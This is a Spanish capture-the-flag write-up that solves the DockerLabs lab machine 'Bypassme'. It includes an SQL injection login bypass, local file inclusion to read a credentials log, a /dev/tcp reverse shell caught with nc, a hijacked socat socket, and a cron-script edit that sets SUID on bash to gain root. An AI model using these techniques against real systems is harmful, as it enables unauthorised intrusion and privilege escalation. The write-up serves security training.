---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Bypassme DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bypassme.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh bypassme.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 11:00 EDT
Nmap scan report for thedog.dl (172.17.0.2)
Host is up (0.000045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b4:a8:42:e7:2b:2f:7a:f9:50:bd:6d:31:8e:36:54:7b (ECDSA)
|_  256 c0:ff:28:31:a3:0b:1a:3d:c3:5f:83:1b:3c:44:28:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login Panel
|_Requested resource was login.php
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

Vemos que hay un puerto `80` que aloja una pagina web, si entramos en ella veremos un `login` bastante interesante en el que vamos a probar credenciales por defecto, pero veremos que no funcionan, por lo que vamos a probar a realizar un `SQLi` a ver si funciona.

```
User: ' OR '1'='1
Pass: ' OR '1'='1
```

Veremos que con eso funciona, por lo que nos mostrara el panel de `administracion`, pero no veremos nada interesante, si inspeccionamos el codigo veremos lo siguiente:

```html
<!-- dev note: remember to secure logs.txt path before deploy -->
```

Por lo que nos indica que hay un archivo `log` por algun lado, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Escalate user albert

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 1826]
/login.php            (Status: 200) [Size: 1826]
/welcome.php          (Status: 200) [Size: 1826]
/.html                (Status: 403) [Size: 275]
/logs                 (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos algo muy interesante y es que hay una carpeta llamada `logs` por lo que podria contener el archivo `logs.txt` vamos a probarlo de esta forma.

```
URL = http://<IP>/logs/logs.txt
```

Veremos que nos esta mostrando un `403` por lo que esta restringido, pero si lo ponemos donde el parametro `page=` para que nos muestre la pagina de esta forma:

```
URL = http://<IP>/index.php?page=logs/logs.txt
```

Info:

```
[2024-03-29 12:04:12] ERROR: Login failed for user 'root'
[2024-03-29 12:04:12] DEBUG: Trying password 'YWRtaW4xMjM='
[2024-03-29 12:04:13] ERROR: Login failed for user 'admin'
[2024-03-29 12:04:14] DEBUG: Trying password 'dGVzdDEyMw=='
[2024-03-29 12:04:16] ERROR: Login failed for user 'test'
[2024-03-29 12:04:18] DEBUG: Login failed from IP 10.10.14.8
[2024-03-29 12:04:19] DEBUG: Login failed from IP 10.10.14.9
[2024-03-29 12:04:20] DEBUG: Login failed from IP 10.10.14.10
[2024-03-29 12:04:21] DEBUG: Login failed from IP 10.10.14.11
[2024-03-29 12:04:22] WARNING: Too many login attempts
[2024-03-29 12:04:23] ERROR: Login attempt for user 'albert'
[2024-03-29 12:04:24] DEBUG: Trying password 'NGxiM3J0MTIz'
[2024-03-29 12:04:25] SUCCESS: Auth success for user 'albert'
[2024-03-29 12:04:26] DEBUG: Session token issued: 38b2fdcbffe78b9989f3e
[2024-03-29 12:04:27] DEBUG: SSH connection established from 10.10.14.8
[2024-03-29 12:04:28] DEBUG: User 'albert' added to sudo group
[2024-03-29 12:04:29] DEBUG: File accessed: /var/www/html/index.php?page=welcome
[2024-03-29 12:04:30] DEBUG: File accessed: /etc/passwd
[2024-03-29 12:04:31] DEBUG: File accessed: /var/log/auth.log
[2024-03-29 12:04:32] DEBUG: File accessed: /var/www/html/login.php
[2024-03-29 12:04:33] DEBUG: File accessed: /var/www/html/logs/logs.txt
[2024-03-29 12:04:34] WARNING: Potential exposure of file logs.txt
[2024-03-29 12:04:35] WARNING: logs.txt contains sensitive authentication data
[2024-03-29 12:04:36] [!!!] SECURITY ALERT: logs/logs.txt is PUBLICLY EXPOSED
[2024-03-29 12:04:37] [!!!] Use this file with caution credentials may be compromised
```

Veremos en las siguientes lienas esto:

```
[2024-03-29 12:04:23] ERROR: Login attempt for user 'albert'
[2024-03-29 12:04:24] DEBUG: Trying password 'NGxiM3J0MTIz'
[2024-03-29 12:04:25] SUCCESS: Auth success for user 'albert'
```

Vemos que hubo una autenticacion exitosa con el usuario `albert` por lo que vamos a probarlo directamente por `SSH`.

### SSH

```shell
ssh albert@<IP>
```

Metemos como contraseña `NGxiM3J0MTIz` y veremos que estaremos dentro.

## Escalate user conx

Vamos a visualizar los procesos del sistema con un binario llamado `pspy64` el cual nos descargaremos desde la maquina `host` y nos lo pasaremos con un servidor de `python3` y con la herramienta `wget` nos lo descargamos en la maquina victima.

```shell
python3 -m http.server
```

> Maquina victima

```shell
cd /tmp
wget http://<IP>:8000/pspy64
```

Una vez que nos lo hayamos descargado, vamos a ejecutarlo de la siguiente forma:

```shell
chmod +x pspy64
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/06/06 09:18:36 CMD: UID=1001  PID=331    | ./pspy64 
2025/06/06 09:18:36 CMD: UID=1001  PID=297    | -bash 
2025/06/06 09:18:36 CMD: UID=1001  PID=296    | sshd: albert@pts/0 
2025/06/06 09:18:36 CMD: UID=0     PID=285    | sshd: albert [priv] 
2025/06/06 09:18:36 CMD: UID=33    PID=179    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=173    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=161    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=158    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=153    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=145    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=144    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=142    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=141    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=33    PID=139    | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=0     PID=57     | tail -f /dev/null 
2025/06/06 09:18:36 CMD: UID=1002  PID=54     | socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash 
2025/06/06 09:18:36 CMD: UID=0     PID=50     | /usr/sbin/cron -P 
2025/06/06 09:18:36 CMD: UID=0     PID=44     | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
2025/06/06 09:18:36 CMD: UID=0     PID=24     | /usr/sbin/apache2 -k start 
2025/06/06 09:18:36 CMD: UID=0     PID=1      | /bin/bash /etc/.start_services 
2025/06/06 09:19:01 CMD: UID=0     PID=340    | /usr/sbin/CRON -P 
2025/06/06 09:19:01 CMD: UID=0     PID=342    | /usr/sbin/CRON -P 
2025/06/06 09:19:01 CMD: UID=0     PID=343    | 
2025/06/06 09:19:01 CMD: UID=0     PID=344    | 
2025/06/06 09:19:01 CMD: UID=0     PID=345    | 
2025/06/06 09:19:01 CMD: UID=0     PID=346    | 
^CExiting program... (interrupt)
```

Nada mas se inicie ya de primeras nos va a resaltar en naranja una cosa bastante interesante que esta en esta linea:

```
2025/06/06 09:18:36 CMD: UID=1002  PID=54     | socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
```

Por lo que vemos se esta realizando un `socat` ejecutando la `bash` como el usuario `conx`, por lo que podremos realizar lo siguiente.

```shell
ls -la /home/conx/.cache/.sock
```

Info:

```
srwxrw-rw- 1 conx conx 0 Jun  6 08:59 /home/conx/.cache/.sock
```

Vemos que tiene los permisos necesarios para ahora nosotros realizar lo siguiente:

```shell
socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

Info:

```
whoami
conx
```

Ahora vamos a pasarnos una `shell` un poco mejor de esta forma:

```shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

En la maquina `host` nos ponemos a la escucha antes de lanzar el comando.

```shell
nc -lvnp <PORT>
```

Ahora si ejecutamos el comando y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 36954
bash: cannot set terminal process group (52): Inappropriate ioctl for device
bash: no job control in this shell
conx@30c1dad442ff:~$ whoami
whoami
conx
```

Vamos a sanitizar la `shell` de esta forma:

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si listamos los `crontabs` que hay en el sistema veremos esto:

```shell
ls -la /etc/cron.d/
```

Info:

```
total 24
drwxr-xr-x 2 root root 4096 May 21 13:58 .
drwxr-xr-x 1 root root 4096 Jun  6 08:59 ..
-rw-r--r-- 1 root root  102 Mar 30  2024 .placeholder
-rw-r--r-- 1 root root   43 May 21 01:36 backup-cron
-rw-r--r-- 1 root root  201 Apr  8  2024 e2scrub_all
-rw-r--r-- 1 root root  712 Jan 18  2024 php
```

Vemos que hay uno distinto de lo normal, que no se crea por defecto llamado `backup-cron` vamos a ver que contiene:

```
* * * * * root bash /var/backups/backup.sh
```

Vemos que ejecuta un `.sh`, por lo que vamos a ver si pudieramos modificar dicho script con los permisos que tenga.

```shell
ls -la /var/backups/backup.sh
```

Info:

```
-rw-rw-r-- 1 conx root 246 May 22 15:47 /var/backups/backup.sh
```

Vemos que si podemos por lo que vamos hacer lo siguiente:

```shell
echo "chmod u+s /bin/bash" >>  /var/backups/backup.sh
```

Ahora solo tendremos que esperar un rato, despues de esperar si listamos los permisos de la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que ha funcionado, por lo que tendremos que realizar lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que habremos terminado la maquina.
